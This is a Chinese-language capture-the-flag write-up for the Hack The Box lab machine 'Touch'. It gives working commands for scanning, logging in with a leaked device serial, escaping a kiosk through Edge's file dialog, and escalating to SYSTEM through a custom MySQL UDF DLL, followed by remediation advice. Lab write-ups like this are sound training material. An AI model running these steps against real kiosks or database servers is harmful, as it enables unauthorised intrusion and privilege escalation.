---
title: "HTB Touch：机场 Kiosk 逃逸与 MySQL UDF 提权"
date: 2026-11-11
categories: ["网络攻防"]
tags: ["HTB", "靶场", "Windows", "MySQL", "提权"]
description: "HTB Touch（Windows / Easy）实战：DeviceHub 信息泄露、Kiosk 逃逸拿到 KioskUser，再用 MySQL UDF 以 SYSTEM 身份读出 root flag"
draft: false
password: true
---

Touch 是一台机场主题的 Windows 机器，剧情接着 Layover：上一台机器里拿到的旅客姓名和订座号，在这里可以直接用来登录自助值机。

| 项目 | 内容 |
| --- | --- |
| 目标 | 10.129.205.193（Touch） |
| 系统 | Windows / Easy |
| 初始凭据 | `Jenny Crawford / KS7X2M`（来自 Layover） |
| 入口 | RDP Kiosk 会话 |
| 关键点 | DeviceHub 序列号当密码、Kiosk 逃逸、MySQL UDF |

## 0. 侦察

全端口扫描只看到 4 个端口：

```bash
nmap -Pn -p- --min-rate 3000 -T4 10.129.205.193
```

```text
135/tcp   open  msrpc
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8443/tcp  open  https-alt
```

`8443` 上是 **Nexion DeviceHub** 的登录页（设备管理平台），`3389` 是 RDP。先看 Web。

## 1. DeviceHub：序列号就是密码

`/api/status` 不需要认证，直接泄露设备信息：

```bash
curl -s http://10.129.205.193:8443/api/status
```

```json
{"device":"Nexion DeviceHub DH-100","serial":"NX-DH-2024-B7042","firmware":"1.4.2","status":"online","uptime":37540}
```

而登录页的“忘记密码”提示写着：默认密码就是设备序列号。于是用 `NX-DH-2024-B7042` 登录成功：

```bash
curl -s -c /tmp/cookies -d "password=NX-DH-2024-B7042" http://10.129.205.193:8443/login
```

Dashboard 里除了设备状态，还把硬件绑定的账号密码直接渲染在 HTML 里（前端“show”只是切换显示）：

```text
Scanner  — Username: KioskUser   Password: K!0sk2026#
Printer  — Username: KioskUser   Password: K!0sk2026#
```

同时页面上有扫描仪/打印机的电源开关，对应接口：

```bash
curl -b /tmp/cookies -H "Content-Type: application/json" \
  -d '{"powered":false}' http://10.129.205.193:8443/api/scanner/power
curl -b /tmp/cookies -H "Content-Type: application/json" \
  -d '{"powered":false}' http://10.129.205.193:8443/api/printer/power
```

这一步是后面 Kiosk 逃逸的伏笔。

## 2. 入口：RDP 到 Kiosk

先用 `KioskUser:K!0sk2026#` 试 RDP。普通客户端会报 `SSL_NOT_ALLOWED_BY_SERVER`——服务器不允许 TLS，需要显式使用标准 RDP 安全层：

```bash
xfreerdp /v:10.129.205.193 /u:KioskUser /p:'K!0sk2026#' \
  /cert:ignore /sec:rdp /size:1280x800 +clipboard
```

登录后是一个全屏的「HTB Airways」自助值机应用，只有 Self check-in 和 Staff Login 两个入口。

## 3. Kiosk 逃逸

### 3.1 故意制造错误

Staff Login 需要扫描员工胸卡。但我们已经通过 DeviceHub 把扫描仪断电了，点 **Scan Badge** 后应用直接抛错：

![1](../../touch/01-kiosk-error.png)

错误弹窗里带一个可点击的“support page”链接——Kiosk 套壳应用最典型的突破口：错误处理会拉起一个完整的浏览器。

### 3.2 从错误链接到 cmd.exe

点链接会打开 Microsoft Edge。在 Edge 里按 `Ctrl+O` 调出原生文件对话框：

![2](../../touch/02-edge-open.png)

在文件名里填 `C:\Windows\System32\cmd.exe` 回车。Edge 会把它当成“下载”，在下载面板出现 `cmd.exe`，点 **Open file** 即执行。

于是拿到了 `kiosk-042\kioskuser` 的命令行：

![3](../../touch/03-cmd-whoami.png)

> 如果扫描仪没断电，错误不会触发；这也是为什么前面要先关设备。应用自身每 2 分钟会重置一次会话，逃逸动作要在窗口期内完成。

## 4. 用户层

`KioskUser` 的桌面上就是 user flag：

```bat
type C:\Users\KioskUser\Desktop\user.txt
```

```text
04317dcf248090e746570035********
```

![4](../../touch/04-user-flag.png)

## 5. 提权：MySQL UDF → SYSTEM

### 5.1 本地枚举

`netstat -ano` 显示本机 `127.0.0.1:3306` 有 MySQL 在跑，安装目录是 `C:\MySQL`。root 空密码登录失败，但在 `C:\ProgramData\HTB Airways\` 下找到了一个可读的维护脚本 `refresh-dates.bat`：

```bat
@echo off
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql" 2>nul
```

MySQL root 密码到手：`HTB@irw4ys_DB!2026`。MySQL 服务以 SYSTEM 运行。

### 5.2 为什么不能直接用 LOAD_FILE

MySQL 8 的 `secure_file_priv` 是 NULL，等于**禁用**一切文件导入导出：

```text
mysql> select @@secure_file_priv;
NULL
mysql> select load_file('C:/Windows/win.ini');
NULL
mysql> select "x" into dumpfile 'C:/Users/KioskUser/x.txt';
ERROR 1290: The MySQL server is running with the --secure-file-priv option ...
```

所以不能直接读 `Administrator\Desktop\root.txt`，只能走 UDF 加载 DLL 执行代码。

### 5.3 插件目录可写

```bat
icacls C:\MySQL\lib\plugin
```

![5](../../touch/05-plugin-acl.png)

`BUILTIN\Authenticated Users:(M)` —— 普通用户就能往插件目录写文件，这是整条链的关键。

### 5.4 编译并投递 UDF DLL

用 mingw 写一个最小 UDF（导出 `sys_exec_init` / `sys_exec` / `sys_exec_deinit`），不链接 CRT，体积只有 4KB：

```bash
x86_64-w64-mingw32-gcc -shared -Os -s -nostdlib -Wl,-e,0 \
  -o udf.dll udf.c -lkernel32
```

这台机器没有编译器，DLL 只能从外部送进去。剪贴板、RDP 磁盘重定向、反向连接都被环境挡住了，最后用了一个笨但可靠的办法：**把 DLL 转成 base64，通过 RDP 键盘逐字符敲进去**，再用 `certutil` 解码：

```bat
certutil -decode u.b64 u5.dll
certutil -hashfile u5.dll MD5
```

目标上的 MD5 与本地构建完全一致（`a8e13263…`），说明二进制没有被输入过程破坏：

![6](../../touch/06-dll-transfer.png)

### 5.5 加载 UDF 并取出 root.txt

把 DLL 复制进插件目录后，用 MySQL root 注册函数：

```sql
DROP FUNCTION sys_exec;
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME "u5.dll";
SELECT sys_exec("x");
```

最初的实现用 `WinExec` 执行命令，函数能加载、能返回，但不产生效果；改成在 DLL 里直接调用 `CopyFileA`（路径硬编码），由 MySQL 的 SYSTEM 身份把管理员桌面的 flag 复制到 KioskUser 的下载目录：

```text
mysql> CREATE FUNCTION sys_exec RETURNS INTEGER SONAME "u5.dll";
Query OK, 0 rows affected (0.01 sec)

C:\Users\KioskUser\Downloads>dir ok*.flag r*.txt
11/16/2026  03:46 AM                 2 ok1.flag
11/16/2026  02:21 AM                34 r1.txt
```

`ok1.flag` 表示复制成功，`r1.txt` 就是 root flag：

![7](../../touch/07-udf-create.png)

```text
f7ccc1b7333703832e6485d6c7********
```

![8](../../touch/08-root-flag.png)

> 这台机器后来被重新上线、flag 也随之更新，按同一套方法重新读取了一次（UDF 执行 + `type r1.txt`）：

![9](../../touch/09-flag-read.png)

## 6. 收尾

这台机器的考点是「把一个低权限交互面（Kiosk）和一台本地 SYSTEM 服务串起来」：

- Web 端把设备序列号当密码，还顺手泄露了 Kiosk 账号；
- Kiosk 应用通过错误处理把浏览器暴露给用户，原生文件对话框等于任意程序执行；
- MySQL 以 SYSTEM 运行、插件目录对普通用户可写，配合一个自编译的 UDF 就能以 SYSTEM 身份操作文件。

修复建议：设备序列号不应作为凭据；Kiosk 应用禁用外部浏览器与文件对话框；MySQL 服务降权运行并收紧插件目录权限。

## 附录：踩过的坑

**坑 0 · RDP 的 `SSL_NOT_ALLOWED_BY_SERVER`。**
普通客户端默认协商 TLS/NLA，被服务器拒绝。加 `/sec:rdp` 使用标准 RDP 安全层即可。

**坑 1 · Kiosk 会话两分钟重置。**
应用自带 idle timeout，重置会杀掉我们开出来的 cmd。逃逸和后续操作要快，或者随时准备重新走一遍错误链接。

**坑 2 · 反向连接全部不可用。**
目标能 ping 通攻击机，但入站 TCP 被防火墙丢包；剪贴板和 RDP 磁盘重定向在这个会话里也不工作。最终只能靠剪贴板以外的通道：base64 + 键盘输入。

**坑 3 · 远程 GUI 自动化的坐标偏移。**
`xdotool getwindowgeometry` 报的位置带父窗口偏移，鼠标实际落点会整体偏几十像素；改用 `xwininfo` 的 absolute 坐标才对准。

**坑 4 · UDF 的 `WinExec` 不生效。**
`CREATE FUNCTION` 成功、`SELECT` 返回 0，但命令没有执行。换成 DLL 内直接 `CopyFileA`（不依赖参数解析和命令行环境）后一次成功——排查这类问题时，先用一个“只写标记文件”的 DLL 验证调用链，比猜快得多。
